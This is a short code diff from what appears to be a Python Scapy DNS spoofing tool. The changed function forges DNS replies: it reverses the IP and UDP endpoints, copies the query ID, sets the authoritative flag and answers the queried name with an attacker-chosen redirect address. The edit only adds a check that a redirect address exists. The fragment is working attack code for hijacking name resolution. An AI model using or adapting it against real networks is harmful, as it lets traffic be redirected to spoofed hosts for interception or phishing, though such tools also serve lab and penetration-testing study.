@@ -61,12 +61,13 @@ def packet_spoofing(pack):
     if is_valid_packet(pack):
         query_name = sanitize(pack[DNSQR].qname)
         ip_to_redirect = get_ip_to_redirect(query_name)
-        sf_pkt = IP(dst=pack[IP].src, src=pack[IP].dst) / \
-                 UDP(dport=pack[UDP].sport, sport=pack[UDP].dport) / \
-                 DNS(ancount=1, id=pack[DNS].id, qd=pack[DNS].qd, aa=1, qr=1,
-                     an=DNSRR(rrname=pack[DNS].qd.qname, rdata=ip_to_redirect, ttl=15))
-        send(sf_pkt)
-        print "New packet is ", pack.summary()
+        if ip_to_redirect:
+            sf_pkt = IP(dst=pack[IP].src, src=pack[IP].dst) / \
+                     UDP(dport=pack[UDP].sport, sport=pack[UDP].dport) / \
+                     DNS(ancount=1, id=pack[DNS].id, qd=pack[DNS].qd, aa=1, qr=1,
+                         an=DNSRR(rrname=pack[DNS].qd.qname, rdata=ip_to_redirect, ttl=15))
+            send(sf_pkt)
+            print "New packet is ", pack.summary()
 
 
 def sanitize(query_name):
